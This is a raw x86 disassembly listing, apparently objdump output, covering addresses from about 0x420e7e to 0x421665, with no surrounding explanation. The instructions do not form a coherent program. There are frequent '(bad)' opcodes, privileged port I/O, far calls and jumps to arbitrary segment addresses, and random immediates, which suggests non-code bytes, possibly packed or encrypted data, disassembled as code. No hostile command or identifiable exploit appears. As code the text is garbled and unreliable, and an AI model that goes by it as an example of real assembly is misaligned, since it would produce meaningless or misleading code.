  420e7e:	pop    ds
  420e7f:	pop    ss
  420e80:	add    eax,0x72150c97
  420e85:	mov    DWORD PTR [edi+ebx*2],ebp
  420e88:	popa   
  420e89:	push   edx
  420e8a:	ins    BYTE PTR es:[edi],dx
  420e8b:	call   0x4b22:0x91c8c468
  420e92:	xchg   edx,eax
  420e93:	mov    fs,WORD PTR [edx]
  420e95:	adc    BYTE PTR [ebp+0x6f7fdbca],al
  420e9b:	imul   esi,esp,0xffffffd7
  420e9e:	adc    bl,bh
  420ea0:	add    ah,al
  420ea2:	inc    edi
  420ea3:	imul   ecx,DWORD PTR [ebp-0x18ab2138],0xfb8be7b8
  420ead:	loop   0x420ee2
  420eaf:	xchg   edx,eax
  420eb0:	loopne 0x420e63
  420eb2:	in     al,0x5b
  420eb4:	nop
  420eb5:	aad    0x58
  420eb7:	jne    0x420ee1
  420eb9:	sbb    ebp,DWORD PTR [edi-0x7beab7e3]
  420ebf:	mov    bl,0x92
  420ec1:	fiadd  WORD PTR [esi]
  420ec3:	loop   0x420eeb
  420ec5:	jge    0x420e6a
  420ec7:	call   0xb0d7:0xf6f762b6
  420ece:	mov    dh,0x9f
  420ed0:	or     BYTE PTR [edx],cl
  420ed2:	mov    ebx,0x77dc2d2b
  420ed7:	jle    0x420ed7
  420ed9:	sbb    BYTE PTR [edx],0x33
  420edc:	les    ecx,FWORD PTR [eax-0x38d95352]
  420ee2:	inc    ebp
  420ee3:	(bad)  
  420ee4:	stc    
  420ee5:	enter  0x4847,0xe5
  420ee9:	pop    esp
  420eea:	out    0x1b,al
  420eec:	mov    DWORD PTR [esi+0x6afe1d58],esp
  420ef2:	(bad)  
  420ef3:	lods   al,BYTE PTR ds:[esi]
  420ef4:	jbe    0x420eee
  420ef6:	je     0x420f69
  420ef8:	fsubr  DWORD PTR [ebx-0x19]
  420efb:	mov    ah,0xa4
  420efd:	dec    ebx
  420efe:	stos   BYTE PTR es:[edi],al
  420eff:	or     BYTE PTR [ebp-0x31],dh
  420f02:	inc    esi
  420f03:	inc    esp
  420f04:	mov    esi,0x948c05bf
  420f09:	inc    esi
  420f0a:	or     eax,0xffae46e7
  420f0f:	shr    edi,0xb6
  420f12:	sbb    DWORD PTR [ebp-0x3dd4ff39],ecx
  420f18:	lea    ebp,[ebp+0x22107d29]
  420f1e:	(bad)  
  420f1f:	leave  
  420f20:	outs   dx,DWORD PTR ds:[esi]
  420f21:	neg    BYTE PTR [edi+0x6dc928e1]
  420f27:	(bad)  
  420f28:	pop    esi
  420f29:	inc    eax
  420f2a:	jnp    0x420ed8
  420f2c:	cld    
  420f2d:	leave  
  420f2e:	mov    edx,0x39cd72bb
  420f33:	pop    esp
  420f34:	dec    esi
  420f35:	aaa    
  420f36:	lods   al,BYTE PTR ds:[esi]
  420f37:	test   eax,0xb706b220
  420f3c:	sbb    bl,BYTE PTR [ebx-0xa57d9de]
  420f42:	stos   DWORD PTR es:[edi],eax
  420f43:	(bad)  
  420f45:	cwde   
  420f46:	xor    esi,DWORD PTR [ebx-0x72f32532]
  420f4c:	mov    bl,0xd5
  420f4e:	add    esi,DWORD PTR [ebx-0x5d8941e]
  420f54:	lea    ebx,[ebp+eiz*2+0x17]
  420f58:	mov    dl,0xe8
  420f5a:	jae    0x420fa3
  420f5c:	xchg   esi,eax
  420f5d:	cmp    eax,0x55ca2ae
  420f62:	mov    bh,0x3f
  420f64:	cmp    edi,edi
  420f66:	popf   
  420f67:	add    eax,DWORD PTR [edx]
  420f69:	push   sp
  420f6b:	xchg   ebx,eax
  420f6c:	hlt    
  420f6d:	xchg   edi,eax
  420f6e:	mov    eax,ds:0xe8e00bb0
  420f73:	cdq    
  420f74:	repnz rol BYTE PTR [edi],1
  420f77:	loop   0x420efa
  420f79:	mov    BYTE PTR [edi],dl
  420f7b:	sbb    BYTE PTR [edx-0x42],dh
  420f7e:	xchg   edi,eax
  420f7f:	mov    ds:0xf6f8640,al
  420f84:	push   ss
  420f85:	push   ss
  420f86:	imul   ecx,DWORD PTR [ebx+0x30],0x1ae38dd1
  420f8d:	pop    eax
  420f8e:	imul   edi,DWORD PTR [ecx+eax*1+0x13],0xffffffbf
  420f93:	jmp    0x772e:0x89ee5160
  420f9a:	iret   
  420f9b:	scas   eax,DWORD PTR es:[edi]
  420f9c:	stc    
  420f9d:	mov    al,0xeb
  420f9f:	sub    edi,edx
  420fa1:	popa   
  420fa2:	iret   
  420fa3:	inc    ebx
  420fa4:	mov    dh,0x90
  420fa6:	mov    ch,0x20
  420fa8:	push   es
  420fa9:	repz dec ebp
  420fab:	jge    0x420f8e
  420fad:	mov    WORD PTR [edx+edi*2-0x40160e14],gs
  420fb4:	in     al,0x7d
  420fb6:	(bad)  
  420fb8:	xchg   BYTE PTR [ebp-0x55],bh
  420fbb:	ret    0xa64d
  420fbe:	fld    TBYTE PTR [ecx-0x45ce2b59]
  420fc4:	add    dh,BYTE PTR es:[ebp+0x192558aa]
  420fcb:	out    dx,al
  420fcc:	retf   
  420fcd:	fstp   QWORD PTR [edi]
  420fcf:	or     eax,0x74e0439d
  420fd4:	mov    ds:0xfaa9aebf,al
  420fd9:	sub    al,0xcb
  420fdb:	fnstcw WORD PTR [edx+0x1b]
  420fde:	pop    ss
  420fdf:	jecxz  0x420f9d
  420fe1:	and    al,0x5d
  420fe3:	jl     0x420f6e
  420fe5:	xchg   ebp,eax
  420fe6:	loope  0x420fb3
  420fe8:	adc    eax,DWORD PTR [edi+0x4a]
  420feb:	fisubr DWORD PTR [esi+0x13]
  420fee:	mov    ds:0xa497fba1,eax
  420ff3:	inc    ecx
  420ff4:	adc    edi,DWORD PTR [ebx+ebx*1+0x5cf51182]
  420ffb:	jo     0x420f9f
  420ffd:	call   0x5337:0xccb533fe
  421004:	xor    ecx,0x54
  421007:	scas   eax,DWORD PTR es:[edi]
  421008:	jns    0x420fed
  42100a:	mov    dh,0x89
  42100c:	outs   dx,BYTE PTR ds:[esi]
  42100d:	push   es
  42100e:	ret    
  42100f:	pop    ss
  421010:	dec    esi
  421011:	mov    ebp,0x18280037
  421016:	adc    DWORD PTR [edi+ecx*1+0x5f],ecx
  42101a:	in     al,0xd1
  42101c:	idiv   BYTE PTR [ebp-0x7ff62fd3]
  421022:	sbb    eax,0x38e3f099
  421027:	xchg   ebp,eax
  421028:	daa    
  421029:	pop    ds
  42102a:	adc    bl,bh
  42102c:	jns    0x421069
  42102e:	adc    BYTE PTR [edx+ecx*8+0x2aeee13a],ch
  421035:	sbb    eax,0x816298e3
  42103a:	fidivr DWORD PTR [ecx]
  42103c:	adc    eax,DWORD PTR [edx+0x47]
  42103f:	loop   0x421056
  421041:	xchg   ebp,eax
  421042:	arpl   WORD PTR [esi],ax
  421044:	fnsave [ebp+0x4adddcfb]
  42104a:	retf   0x7f7
  42104d:	sbb    al,0x4e
  42104f:	and    dl,bl
  421051:	mov    ebp,0x13c77f33
  421056:	fcomp  QWORD PTR [ecx-0x66578ec8]
  42105c:	cmp    DWORD PTR [edi],esp
  42105e:	icebp  
  42105f:	jbe    0x421046
  421061:	xor    dl,ch
  421063:	or     BYTE PTR [esi],dh
  421065:	cmp    al,0xac
  421067:	xor    DWORD PTR [esi+0x38852fe3],ebx
  42106d:	jae    0x421093
  42106f:	jmp    0x829480da
  421074:	jbe    0x421098
  421076:	test   eax,0xf92de3d
  42107b:	and    edi,DWORD PTR [edi]
  42107d:	nop
  42107e:	das    
  42107f:	cmc    
  421080:	in     eax,dx
  421081:	dec    esi
  421082:	imul   edi,DWORD PTR [ebx+0x430e326a],0xffffffdf
  421089:	not    DWORD PTR [eax]
  42108b:	fs nop
  42108d:	fs or  eax,ebx
  421090:	outs   dx,DWORD PTR ds:[esi]
  421091:	mov    ds:0x432732b5,al
  421096:	das    
  421097:	iret   
  421098:	ins    BYTE PTR es:[edi],dx
  421099:	call   FWORD PTR [esi]
  42109b:	dec    ebx
  42109c:	cmp    al,0xe6
  42109e:	sub    al,0xcc
  4210a0:	nop
  4210a1:	ret    
  4210a2:	jl     0x421056
  4210a4:	inc    eax
  4210a5:	jbe    0x4210b9
  4210a7:	out    0xc9,al
  4210a9:	test   BYTE PTR [ebx],bl
  4210ab:	pop    ecx
  4210ac:	ds pop esi
  4210ae:	jg     0x4210c4
  4210b0:	aad    0x29
  4210b2:	mov    al,ds:0xaf968d3
  4210b7:	sbb    BYTE PTR [ecx-0x1e],ah
  4210ba:	ins    DWORD PTR es:[edi],dx
  4210bb:	mov    bl,BYTE PTR [edi+0x5ebbd692]
  4210c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210c2:	mov    dh,0xf8
	...
  4210d0:	add    BYTE PTR [edx+0x70],cl
  4210d3:	fdivr  DWORD PTR [edx+edi*8-0x4]
  4210d7:	out    dx,al
  4210d8:	jbe    0x4210cf
  4210da:	outs   dx,DWORD PTR ds:[esi]
  4210db:	cmp    al,0xe0
  4210dd:	mov    eax,0x6f9dd3e6
  4210e2:	mov    al,BYTE PTR [ecx]
  4210e4:	add    BYTE PTR [ebx-0x29fffffd],ch
  4210ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210eb:	lds    edi,FWORD PTR [edx-0x36]
  4210ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210ef:	lods   al,BYTE PTR ds:[esi]
  4210f0:	fld    st(7)
  4210f2:	pop    ecx
  4210f3:	mov    BYTE PTR [esi-0x2b],0x48
  4210f7:	xchg   DWORD PTR [ebx-0x24d1de6f],ebp
  4210fd:	lods   al,BYTE PTR ds:[esi]
  4210fe:	addr16 jmp 0xcd9aaca0
  421104:	(bad)  
  421105:	cdq    
  421106:	dec    ebx
  421107:	xor    BYTE PTR [ecx+0x6b],dl
  42110a:	xchg   ecx,eax
  42110b:	dec    ebp
  42110c:	pop    ss
  42110d:	stos   DWORD PTR es:[edi],eax
  42110e:	sub    eax,0x6518e0c8
  421113:	ja     0x421135
  421115:	(bad)  
  421116:	mov    bl,0x4b
  421118:	mov    ah,0x14
  42111a:	xor    DWORD PTR [ecx],0x23
  42111d:	jg     0x421191
  42111f:	xchg   ebp,eax
  421120:	sub    al,BYTE PTR [ecx-0x70]
  421123:	adc    DWORD PTR ds:0x2025e83,ebx
  421129:	outs   dx,DWORD PTR ds:[esi]
  42112a:	test   al,0xaa
  42112c:	bound  edx,QWORD PTR [edx+0x23]
  42112f:	sub    ebx,DWORD PTR [eax-0x1d]
  421132:	mov    al,0xa9
  421134:	mov    ebx,0x613f8c6a
  421139:	dec    ebp
  42113a:	jecxz  0x421156
  42113c:	int3   
  42113d:	xlat   BYTE PTR ds:[ebx]
  42113e:	push   edx
  42113f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421140:	shr    DWORD PTR [ecx],0x72
  421143:	or     ebp,DWORD PTR [ecx]
  421145:	mov    ds:0x3eec9ad9,al
  42114a:	push   edx
  42114b:	into   
  42114c:	out    0xad,al
  42114e:	jle    0x421193
  421150:	mov    esp,0xa84ac04a
  421155:	mov    edx,0xeef3645
  42115a:	mov    ch,0xa7
  42115c:	inc    esp
  42115d:	mov    ebp,0x6c4186c1
  421162:	dec    ecx
  421163:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421164:	xor    eax,0xe3d9b4e1
  421169:	loope  0x421188
  42116b:	shr    DWORD PTR [edi+0x4de7b136],0x5b
  421172:	inc    edi
  421173:	lock push 0x4c
  421176:	stos   BYTE PTR es:[edi],al
  421177:	jecxz  0x421101
  421179:	jbe    0x4211cb
  42117b:	lea    esi,[edi+0x40159a1b]
  421181:	dec    eax
  421182:	cld    
  421183:	mov    ebp,0x7f82595f
  421188:	cwde   
  421189:	cli    
  42118a:	clc    
  42118b:	popa   
  42118c:	pusha  
  42118d:	fwait
  42118e:	pop    ds
  42118f:	loop   0x42113c
  421191:	aad    0xc2
  421193:	push   ebp
  421194:	sbb    al,0x3f
  421196:	dec    ecx
  421197:	sub    BYTE PTR [esi-0x1acb635c],bh
  42119d:	clc    
  42119e:	cwde   
  42119f:	and    DWORD PTR [esi],edx
  4211a1:	xlat   BYTE PTR ds:[ebx]
  4211a2:	push   esp
  4211a3:	pop    ebp
  4211a4:	out    0xfa,eax
  4211a6:	xor    ebx,DWORD PTR [ecx-0x72]
  4211a9:	jno    0x4211fc
  4211ab:	stos   DWORD PTR es:[edi],eax
  4211ac:	out    0x80,eax
  4211ae:	cwde   
  4211af:	add    BYTE PTR [esi+0x23dd7a02],ch
  4211b5:	inc    ebp
  4211b6:	in     eax,0xbb
  4211b8:	xor    bh,al
  4211ba:	jo     0x421154
  4211bc:	sbb    al,0x7
  4211be:	sub    eax,0xd33e31c9
  4211c3:	xchg   ebx,eax
  4211c4:	test   BYTE PTR [edi-0xf],bh
  4211c7:	lock (bad) 
  4211c9:	(bad)  
  4211ca:	call   0x242f:0x152ce996
  4211d1:	aaa    
  4211d2:	scas   al,BYTE PTR es:[edi]
  4211d3:	out    dx,eax
  4211d4:	or     al,0x52
  4211d6:	inc    edi
  4211d7:	ins    DWORD PTR es:[edi],dx
  4211d8:	(bad)  
  4211da:	(bad)  [ebx-0x31]
  4211dd:	inc    esi
  4211de:	ret    
  4211df:	stc    
  4211e0:	jl     0x4211c1
  4211e2:	mov    ah,BYTE PTR [ebx-0x5006889c]
  4211e8:	in     eax,0xe5
  4211ea:	out    0xdb,eax
  4211ec:	(bad)  
  4211ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211ee:	jl     0x4211f2
  4211f0:	jmp    0x5eb2:0x4d8cc7b5
  4211f7:	dec    edi
  4211f8:	jecxz  0x421225
  4211fa:	push   ecx
  4211fb:	push   0x12
  4211fd:	xor    al,0x32
  4211ff:	xor    ebp,DWORD PTR [ebp-0x14]
  421202:	pop    es
  421203:	mov    ah,0x7
  421205:	mov    WORD PTR [ecx+0x5e],ds
  421208:	or     dl,ah
  42120a:	or     dh,al
  42120c:	and    ecx,0x78
  42120f:	mov    al,0x25
  421211:	adc    al,al
  421213:	(bad)  
  421214:	cmp    al,0x38
  421216:	out    0xd9,al
  421218:	sbb    DWORD PTR [edx+0x76f610f0],0xffffffd1
  42121f:	aad    0xf3
  421221:	sbb    al,0xdc
  421223:	cmp    eax,DWORD PTR [esi]
  421225:	sub    ah,BYTE PTR [ebp+0xc]
  421228:	mov    BYTE PTR [esi+ebx*2-0x706935de],dl
  42122f:	cmp    DWORD PTR [eax+0x708ad548],eax
  421235:	retf   0xe536
  421238:	arpl   WORD PTR [eax+0x3d586be3],dx
  42123e:	cmp    al,0xf0
  421240:	(bad)
  421244:	and    DWORD PTR [esi],ecx
  421246:	sbb    esp,DWORD PTR [esi]
  421248:	inc    esp
  421249:	sub    al,0x75
  42124b:	xor    dh,ch
  42124d:	xchg   edi,eax
  42124e:	mov    edx,0xe0d4ae7f
  421253:	leave  
  421254:	in     al,dx
  421255:	push   edx
  421256:	pop    ebx
  421257:	cmp    ebp,DWORD PTR [ebx+0x5f0de393]
  42125d:	mov    dh,0x4e
  42125f:	jecxz  0x421241
  421261:	pop    edx
  421262:	ror    DWORD PTR [eax-0x30b8cbd0],0xe1
  421269:	and    esi,eax
  42126b:	xchg   edx,eax
  42126c:	mov    dh,0x4f
  42126e:	or     eax,0xa62d2b5
  421273:	out    dx,al
  421274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421275:	xor    dh,ah
  421277:	sbb    DWORD PTR [ebp+0x52d997b6],0x83538ff
  421281:	hlt    
  421282:	mov    dh,0x9c
  421284:	inc    ebp
  421285:	xchg   ebx,eax
  421286:	mov    ah,0xd5
  421288:	ficom  WORD PTR [edx+0x75d5f02d]
  42128e:	sbb    ah,ch
  421290:	xchg   edi,eax
  421291:	stos   DWORD PTR es:[edi],eax
  421292:	in     eax,0xe7
  421294:	add    DWORD PTR [ecx+0x2d61f7d0],ecx
  42129a:	fistp  WORD PTR [esi+0x4de8d195]
  4212a0:	call   0xb1073e8d
  4212a5:	scas   eax,DWORD PTR es:[edi]
  4212a6:	leave  
  4212a7:	xchg   ebp,eax
  4212a8:	fistp  DWORD PTR [ecx]
  4212aa:	jg     0x421272
  4212ac:	mov    ah,0x44
  4212ae:	xchg   edi,eax
  4212af:	jb     0x421236
  4212b1:	sbb    edx,DWORD PTR [ecx-0x31383b38]
  4212b7:	jecxz  0x421258
  4212b9:	fsub   st(6),st
  4212bb:	cs test eax,0xd4118aff
  4212c1:	sahf   
  4212c2:	aam    0x27
  4212c4:	xchg   edi,eax
  4212c5:	inc    esp
  4212c6:	sub    ebp,DWORD PTR [eax-0x289576e2]
  4212cc:	out    0x66,al
  4212ce:	(bad)  [ecx-0x21]
  4212d1:	jecxz  0x42134d
  4212d3:	and    al,0x4d
  4212d5:	lock mov WORD PTR [eax+0x36],?
  4212d9:	push   ebx
  4212da:	(bad)  
  4212dc:	mov    bh,0xc5
  4212de:	fcmovb st,st(3)
  4212e0:	data16 jo 0x4212bb
  4212e3:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4212e5:	adc    DWORD PTR [edi],0x9d2265df
  4212eb:	loope  0x421270
  4212ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212ee:	mov    eax,0x3ec39ee2
  4212f3:	add    eax,0x10e07246
  4212f8:	out    dx,eax
  4212f9:	mov    eax,ds:0x16ac13ce
  4212fe:	pop    edi
  4212ff:	or     eax,0x35771e09
  421304:	enter  0xa80d,0xaa
  421308:	daa    
  421309:	and    BYTE PTR [edx],cl
  42130b:	in     al,dx
  42130c:	ins    DWORD PTR es:[edi],dx
  42130d:	imul   ebx,DWORD PTR [ebx+ebx*4+0x2b279088],0x68890bb5
  421318:	fwait
  421319:	adc    eax,0xc2cc1618
  42131e:	pop    ds
  42131f:	(bad)  
  421320:	jno    0x421389
  421322:	rol    DWORD PTR [eax+0x79],cl
  421325:	xor    DWORD PTR ds:0xb8ab8b2e,0xe7d981a2
  42132f:	adc    DWORD PTR [ecx-0x6831bf10],edi
  421335:	mov    BYTE PTR [edi],ch
  421337:	xchg   DWORD PTR [eax-0x50],eax
  42133a:	push   edx
  42133b:	sbb    al,0x85
  42133d:	ja     0x42139e
  42133f:	aaa    
  421340:	add    DWORD PTR ds:0xd874a591,0xa32d853c
  42134a:	test   eax,0xae8e320e
  42134f:	inc    esp
  421350:	inc    ecx
  421351:	dec    ebp
  421352:	popf   
  421353:	rcr    BYTE PTR [eax+0x3b1a68e2],cl
  421359:	fcom   DWORD PTR [eax+0x56]
  42135c:	aad    0xa9
  42135e:	push   ss
  42135f:	adc    eax,0x4d4e11a
  421364:	xor    eax,0xa27e61df
  421369:	sbb    BYTE PTR gs:[esp+ebp*1],bl
  42136d:	cmp    al,0x2c
  42136f:	arpl   WORD PTR [ecx-0x61],cx
  421372:	xor    DWORD PTR [esp+esi*8-0x2a],0x5d
  421377:	int    0x93
  421379:	cmp    al,cl
  42137b:	(bad)  
  42137c:	and    DWORD PTR [eax],edx
  42137e:	sar    BYTE PTR [ebx+ebp*8-0x7964b264],0x45
  421386:	imul   ecx,DWORD PTR [eax],0xea631921
  42138c:	std    
  42138d:	and    eax,0xcae842bf
  421392:	mov    edi,0x4af3efba
  421397:	in     eax,dx
  421398:	inc    ebx
  421399:	mov    cl,0x86
  42139b:	std    
  42139c:	in     eax,dx
  42139d:	je     0x42140d
  42139f:	mov    al,ds:0x59e3a157
  4213a4:	push   eax
  4213a5:	repnz or ebx,esp
  4213a8:	or     eax,0x72650942
  4213ad:	sbb    BYTE PTR [esi],0xe
  4213b0:	push   ebp
  4213b1:	shr    edi,1
  4213b3:	push   0xfd314538
  4213b8:	mov    WORD PTR ds:0x52278365,?
  4213be:	mov    edx,0xdedf47dd
  4213c3:	push   0x4ca63a33
  4213c8:	aad    0x9b
  4213ca:	(bad)  
  4213cb:	xchg   edi,eax
  4213cc:	adc    DWORD PTR ds:0x81d1c4cd,0xfffffff3
  4213d3:	stos   DWORD PTR es:[edi],eax
  4213d4:	xchg   BYTE PTR [edx],ah
  4213d6:	out    dx,eax
  4213d7:	pop    ss
  4213d8:	jmp    0x4213c6
  4213da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213db:	inc    ecx
  4213dc:	mov    cl,0xdb
  4213de:	test   al,0x53
  4213e0:	ror    DWORD PTR [ecx],1
  4213e2:	jp     0x4213bf
  4213e4:	cwde   
  4213e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213e6:	pop    edi
  4213e7:	cmp    ecx,0x5
  4213ea:	jp     0x42143d
  4213ec:	jge    0x4213b4
  4213ee:	xchg   BYTE PTR [ebx+0x26b9308e],cl
  4213f4:	add    eax,0x3c2d4384
  4213f9:	dec    ecx
  4213fa:	push   eax
  4213fb:	(bad)  [ebx-0x2c1bd352]
  421401:	pushf  
  421402:	ja     0x42143c
  421404:	mov    ds:0x1bffd620,eax
  42140a:	jecxz  0x421411
  42140c:	or     DWORD PTR [esi+0x7d],ebp
  42140f:	jnp    0x421407
  421411:	outs   dx,DWORD PTR ds:[esi]
  421412:	int    0x9
  421414:	sub    eax,0x2955cd05
  421419:	add    eax,0xf38446ee
  42141e:	sbb    eax,0xa81fd1dc
  421423:	pusha  
  421424:	cwde   
  421425:	jge    0x421440
  421427:	popa   
  421428:	loop   0x4213c1
  42142a:	fnsave [ebx+0x9]
  42142d:	sub    BYTE PTR [edi+0x41],ch
  421430:	sti    
  421431:	push   cs
  421432:	lahf   
  421433:	(bad)  
  421434:	test   BYTE PTR ds:0x6c31bc1d,0x62
  42143b:	sub    bl,BYTE PTR [edx]
  42143d:	fcmovnb st,st(6)
  42143f:	dec    DWORD PTR [ecx]
  421441:	mov    ds:0xcb147f35,eax
  421446:	cmp    eax,0xb6185b64
  42144b:	push   ebx
  42144c:	mov    ecx,0xc4a7d686
  421451:	cmp    edi,0xffffff91
  421454:	or     esp,0x62df164f
  42145a:	jb     0x4214cc
  42145c:	dec    eax
  42145d:	mov    esi,0x1958697e
  421462:	retf   
  421463:	(bad)  
  421465:	cdq    
  421466:	lods   al,BYTE PTR ds:[esi]
  421467:	bound  ebx,QWORD PTR [edx]
  421469:	sub    BYTE PTR [ebx],dl
  42146b:	in     al,0x3e
  42146d:	stos   BYTE PTR es:[edi],al
  42146e:	pop    ss
  42146f:	push   0x942abb0f
  421474:	pop    ebp
  421475:	inc    ebp
  421476:	sbb    al,0x38
  421478:	xchg   edx,eax
  421479:	ins    DWORD PTR es:[edi],dx
  42147a:	clc    
  42147b:	pusha  
  42147c:	adc    cl,BYTE PTR [edx-0x5c]
  42147f:	inc    edi
  421480:	adc    dl,BYTE PTR [ecx-0x65def202]
  421486:	fdivrp st(6),st
  421488:	xor    DWORD PTR [esi+eax*8+0x397671a],ebp
  42148f:	nop
  421490:	scas   eax,DWORD PTR es:[edi]
  421491:	jnp    0x4214d3
  421493:	jns    0x421495
	...
  4214a1:	(bad)  
  4214a2:	fld    QWORD PTR [ebx-0x70212c74]
  4214a8:	fstp   QWORD PTR [ebp+0x2a279950]
  4214ae:	add    bl,BYTE PTR [edi]
  4214b0:	popa   
  4214b1:	sbb    cl,BYTE PTR [esi+0x3ab0001]
  4214b7:	add    BYTE PTR [eax],al
  4214b9:	fs hlt 
  4214bb:	shl    BYTE PTR [ebx+ebx*1],cl
  4214be:	frstor ds:0xf82699b5
  4214c4:	popa   
  4214c5:	call   0xc078:0xde5f7384
  4214cc:	lods   eax,DWORD PTR cs:[esi]
  4214ce:	add    dh,bh
  4214d0:	retf   0xfc6
  4214d3:	mul    DWORD PTR [ebx+0x2fae4d4b]
  4214d9:	das    
  4214da:	push   0xffffffd6
  4214dc:	dec    ecx
  4214dd:	push   esp
  4214de:	pushf  
  4214df:	jo     0x42155d
  4214e1:	mov    bl,0xdd
  4214e3:	cld    
  4214e4:	mov    ebp,0x378fd041
  4214e9:	cmp    DWORD PTR [edi],eax
  4214eb:	mov    ah,0xd6
  4214ed:	pop    DWORD PTR [esi+0x3be71bc0]
  4214f3:	rcr    BYTE PTR ds:0x47ba2a50,1
  4214f9:	xchg   edx,esi
  4214fb:	(bad)  
  4214fc:	fldcw  WORD PTR [esi+0x806a011]
  421502:	mov    bh,bh
  421504:	mov    ebp,0x32803284
  421509:	mov    dh,0x49
  42150b:	icebp  
  42150c:	mov    ds,esi
  42150e:	jnp    0x42158d
  421510:	pop    edx
  421512:	jle    0x42151f
  421514:	mov    esi,0xe1a91849
  421519:	call   0x7616:0x3bcc396a
  421520:	pop    esi
  421521:	dec    edi
  421522:	xlat   BYTE PTR ds:[ebx]
  421523:	mov    eax,ds:0x1f570c2b
  421528:	mov    bh,0xcf
  42152a:	sbb    al,0x2f
  42152c:	mov    bl,0xcf
  42152e:	pushf  
  42152f:	mov    edi,0xaeb6c912
  421534:	es jmp 0xdd6d9db5
  42153a:	(bad)  
  42153b:	stc    
  42153c:	or     BYTE PTR [ebx],0x1d
  42153f:	dec    esi
  421540:	sbb    dl,BYTE PTR [eax]
  421542:	xchg   edx,eax
  421543:	fisttp DWORD PTR [edx+0x2b9dee5c]
  421549:	loope  0x42150b
  42154b:	push   0x7
  42154d:	(bad)  
  42154e:	in     al,dx
  42154f:	adc    DWORD PTR [eax+0x4d],esp
  421552:	ficom  WORD PTR [ecx]
  421554:	out    dx,al
  421555:	xchg   BYTE PTR [edx-0x30],cl
  421558:	(bad)  
  421559:	daa    
  42155a:	(bad)  
  42155b:	(bad)  
  42155c:	jg     0x42152f
  42155e:	jle    0x421582
  421560:	xchg   esp,edx
  421562:	shl    DWORD PTR [ebx+ebp*2+0x6139806a],0x2a
  42156a:	dec    esi
  42156b:	pop    ss
  42156c:	and    DWORD PTR fs:[ebp-0x4e],esp
  421570:	mov    al,0x0
  421572:	jle    0x4215ee
  421574:	ins    DWORD PTR es:[edi],dx
  421575:	out    dx,al
  421576:	xor    eax,DWORD PTR [esi]
  421578:	call   0xc1efdb1e
  42157d:	sub    DWORD PTR [ecx+0x7],ebp
  421580:	lods   al,BYTE PTR ds:[esi]
  421581:	jmp    0x421588
  421583:	adc    ebp,DWORD PTR [esi]
  421585:	cmp    ecx,DWORD PTR gs:[ecx+0x3c]
  421589:	jge    0x42153d
  42158b:	imul   edx,DWORD PTR [ebp+esi*8-0x54c221eb],0xffffff95
  421593:	jne    0x4215e3
  421595:	lock inc ebx
  421597:	jns    0x4215d4
  421599:	scas   eax,DWORD PTR es:[edi]
  42159a:	jmp    0xa95a:0xa291775f
  4215a1:	cmp    BYTE PTR [esi],bh
  4215a3:	cld    
  4215a4:	ficom  DWORD PTR [ecx-0x6a]
  4215a7:	outs   dx,BYTE PTR ds:[esi]
  4215a8:	sar    ecx,cl
  4215aa:	in     al,dx
  4215ab:	or     BYTE PTR [edx+edi*8-0x57],cl
  4215af:	cmp    dh,BYTE PTR [edi+0x7]
  4215b2:	mov    eax,ds:0x38c80c65
  4215b7:	mov    edi,0x3c857dd1
  4215bc:	lods   eax,DWORD PTR ds:[esi]
  4215bd:	hlt    
  4215be:	(bad)  
  4215bf:	call   0xa720b6e3
  4215c4:	daa    
  4215c5:	xchg   ebx,eax
  4215c6:	xchg   edx,eax
  4215c7:	dec    ecx
  4215c8:	mov    ah,0x26
  4215ca:	add    eax,0xd483bdf9
  4215cf:	push   ebx
  4215d0:	pop    esp
  4215d1:	pushf  
  4215d2:	sub    eax,0x9d52aad8
  4215d7:	sub    BYTE PTR ss:0xd09284b8,bh
  4215de:	mov    bl,0x41
  4215e0:	lods   eax,DWORD PTR ds:[esi]
  4215e1:	lahf   
  4215e2:	jns    0x4215f4
  4215e4:	mov    ch,0x5b
  4215e6:	call   0x8317:0xf4701b09
  4215ed:	in     al,dx
  4215ee:	and    dl,ah
  4215f0:	sbb    BYTE PTR [edi+0x40],cl
  4215f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215f4:	dec    esi
  4215f5:	fdivr  DWORD PTR [ecx-0x29]
  4215f8:	jb     0x4215bb
  4215fa:	xor    BYTE PTR [esi+0x72a59b8c],dl
  421600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421601:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421602:	push   0x52
  421604:	dec    ecx
  421605:	jae    0x421616
  421607:	imul   esp,DWORD PTR [esi],0x68c1f2c2
  42160d:	rol    ebp,0x41
  421610:	xchg   ecx,eax
  421611:	jbe    0x4215fd
  421613:	cmp    al,al
  421615:	pop    ecx
  421616:	push   esi
  421617:	xchg   ebx,eax
  421618:	push   ss
  421619:	adc    ch,bl
  42161b:	inc    ebx
  42161c:	jbe    0x421647
  42161e:	push   es
  42161f:	in     al,dx
  421620:	mov    bl,BYTE PTR cs:0x2438dc82
  421627:	lea    ecx,ds:0x1d598dfa
  42162d:	sub    DWORD PTR [edx+0x7dad24ee],0xffffffc7
  421634:	pop    ss
  421635:	mov    esi,0xfb044a64
  42163a:	mul    DWORD PTR [esi+0x4f]
  42163d:	sub    DWORD PTR [esi],esi
  42163f:	lock adc esi,0x567eb6ff
  421646:	mov    eax,ds:0x91ed10d9
  42164b:	cmc    
  42164c:	mov    bh,BYTE PTR [eax+0x5f]
  42164f:	jno    0x42166e
  421651:	scas   al,BYTE PTR es:[edi]
  421652:	push   ss
  421653:	(bad)  
  421654:	mov    bh,0x96
  421656:	in     al,0xf3
  421658:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421659:	xchg   esp,eax
  42165a:	inc    ebp
  42165b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42165c:	sub    eax,0x7cbb18cd
  421661:	sub    ebp,edi
  421663:	jle    0x4216b9
  421665:	test   DWORD PTR [ebx+ebx*2+0x21],edx
